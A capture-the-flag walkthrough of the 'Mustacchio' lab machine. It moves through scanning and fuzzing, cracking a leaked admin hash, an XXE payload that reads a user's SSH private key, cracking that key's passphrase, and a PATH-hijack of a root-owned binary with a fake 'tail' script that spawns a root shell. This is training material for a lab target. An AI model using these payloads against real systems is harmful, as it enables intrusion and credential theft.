# Enumeration

## \[+] 10.10.165.54 - mustacchio.thm

We will add the target IP address and a domain name to our `/etc/hosts` file. Using `sudo sh -c`, executes the entire command as a subshell as `root` where we will then use `echo` to create a new line with `\n` followed by our target IP and the domain name we give it.

```sh
sudo sh -c 'echo "\n10.10.165.54 mustacchio.thm" >> /etc/hosts'
```

Then `export` the IP address to the environment variable `RHOSTS` so I can use `$RHOSTS` instead of typing the IP address every time.

```sh
export RHOSTS=10.10.165.54
```

First I run a quick scan with [rustscan](https://github.com/RustScan/RustScan) and a longer [nmap](https://nmap.org/) stealth scan with `-Pn` mode enabled which will treat all hosts as online which helps find other hosts that block ICMP packets:

```sh
rustscan -a $RHOSTS --ulimit 5000 -b 4500 -t 2000 --range 1-65535 -- -sC -sV
sudo nmap -v -Pn -sS -p- -A --min-rate=1000 -T4 $RHOSTS -oN nmap.txt
```

## \[+] Port 80 - HTTP

Let's start by fuzzing for directories/files using [feroxbuster](https://github.com/epi052/feroxbuster) with this [wordlist](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/raft-medium-directories.txt):

```sh
feroxbuster -u http://mustacchio.thm/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x json,txt,js,xml -s 200,301,302,403 -o p-80-www-ferox.txt
```

After some time, we will find a file with the credentials for the user `admin`:

```sh
wget http://mustacchio.thm/custom/js/users.bak
cat users.bak
```

## \[+] Port 8765 - HTTP

On this port we will find a login portal for the administration backend:

![611e6f2713c8dd44a03a14a2debfb85b.png](/resources/1815fcbdc95443cd81251500d0b1a6e6.png)

Before we can use the credentials we found, we have to decode the password since it seems to be hashed. We can use a website like [CrackStation](https://crackstation.net/) to see if there is a plaintext version of this hash. Copy and paste the hashed password, do the captcha and click the "Crack Hashes" button. The plaintext will be in the result column if it is available:

![00bbc1168d57573123123dfb775dda6e.png](/resources/eaef2052334b4d159c8ecdd1e5fb3fd2.png)

After logging in, we access a function which allows us to input a comment on the website:

![2deb9db513b058946f4fd000573bda36.png](/resources/c644ab4d5ee8411c9c82d242308dddf5.png)

Testing the function with some input and clicking the "Submit" button creates a "Comment Preview" but our test string is not reflected anywhere:

![065bf413b607a1b66ca0d77353a16c22.png](/resources/556a4d9f197b48b381ec13951444f95b.png)

Let's check the website's source code to see if we can find anything more about this function. Right-click on the page then click "VIew Page Source" or pressing `CTRL+U` will bring up the source code.

On lines 10-18 we will find the code for the comment function and a note left by the developer on line 22:

![01abe546f512ec6b8e0d325e462598d7.png](/resources/b036250ad5ed4ce38f8963248c08a129.png)

We will have to enter our comment in [XML syntax](https://www.w3schools.com/XML/xml_syntax.asp) with the fields, `name`, `author` and `comment`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<root>
	<author>test</author>
	<name>test</name>
	<comment>test</comment>
</root>
```

# Initial Foothold

### \[-] barry\@mustacchio

Now that we know how the function works and that it accepts XML input and reflects the results in the webpage, we can check if it is vulnerable to [XML External Entity](https://portswigger.net/web-security/xxe) injection where we can use XML to read local files, like `/home/barry/.ssh/id_rsa` for example:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///home/barry/.ssh/id_rsa"> ]>
<root>
	<author>&xxe;</author>
</root>
```

![d1f9c6852ff839d778a660ae14f28412.png](/resources/e6ee9a5ff09543ad86d9fedb61befdee.png)

We can get a clean formatting of the SSH key in the source code:

![5706cdd7185c5f7686e87857da02db48.png](/resources/0ecf5c5a60784ceb86805f725b019151.png)

Copy and paste the SSH key starting from:

```plaintext
-----BEGIN RSA PRIVATE KEY-----
```

and ending with:

```plaintext
-----END RSA PRIVATE KEY-----
```

Save the SSH key to a new text file named `barry.key` then run the chmod command to give it proper permissions:

```sh
chmod 600 barry.key
```

If we try to use the key now to connect via SSH, we will be prompted for a password. We will first have to crack the key using [John the Ripper](https://www.openwall.com/john/). To format the key to use with JtR, we have to use the ssh2john tool:

```sh
ssh2john barry.key > barry.john
```

Then use JtR:

```sh
john --wordlist=/usr/share/wordlists/rockyou.txt barry.john
```

## Port 22 - SSH

Let's use the key we just cracked to login via SSH with the ssh command and the `-i` flag to specify the key file to use and enter the password when prompted:

```sh
ssh -i barry.key barry@$RHOSTS
```

![660a8aa083a585d485a6a3b9eb3ab304.png](/resources/533104818d624145a16a6331f59e6e0d.png)

We can find the user flag in `/home/barry/user.txt`:

```sh
ls -lah
cat user.txt
```

![e7c8deb9327154cc477fd2b33718fe02.png](/resources/df9531b560a44548a8f5d825b29daa95.png)

# Privilege Escalation

### \[-] root\@mustacchio

After some enumeration, we will find a binary in `/home/joe/` named `live_log`:

```sh
cd /home/joe
ls -lah
```

![7e7db064027e23b91959ea3d25c06447.png](/resources/6a97a43401d54888beeeb7850a27d5fb.png)

Using the [strings](https://linux.die.net/man/1/strings) command, we can print only the human-readable strings within this binary where we will find a binary without the full path:

```sh
strings live_log
```

![3577945f9bdcd3a17664f4aa53af9771.png](/resources/dcdf500a348946799dbe4ab4b1a8ba9d.png)

When a binary is called withouth the full path in Linux, any binary with the same name will be called if it is "nearest" to the binary that called it. This is called Hijack Execution flow and is explained in detail in [this Mitre article](https://attack.mitre.org/techniques/T1574/007/).

To exploit this, we will first change the `PATH` environment variable to a directory that we can write to using the `export` command, and `echo` the `$PATH` variable to see it point to the `/home/barry` directory:

```sh
cd /home/barry
export PATH=$PWD:$PATH
echo $PATH
```

![1b2ba8e8d13477692b13eb46915bf357.png](/resources/bb738e3cecc64431ae99fc2ed0574726.png)

Now, when we create a binary named `tail` in this directory, it will be used instead of the one in `/usr/bin/`. Using the [nano](https://linux.die.net/man/1/nano) text editor we can create a binary written in Python to create a bash shell. Since the `live_log` binary is owned by the root user, the bash shell is also being ran by the root user which will effectively make us `root`:

```
#!/usr/bin/python3
import pty
pty.spawn("/bin/bash")
```

![dddcc767973f8501570fcdabeac1984e.png](/resources/1503a7f4e5c34e838610cb1ecdf0d32f.png)

Then, press `CTRL+X` and enter `Y` to save. Back in bash, we will use the `chmod` command along with the `+x` flag to make the binary executable and run the `/home/joe/live_log` binary to gain root:

```sh
chmod +x tail
/home/joe/live_log
id
```

![a460d2ad1c06eca12c865de68e976ab8.png](/resources/486c6d1950764465bbf085474174f946.png)

We can find the root flag in `/root/root.txt`:

```sh
cat /root/root.txt
```

![e5f7aed3154277c3d0becb49afc6f7ee.png](/resources/86ceeb0a03a34fb6b2e2fd042e0c879f.png)
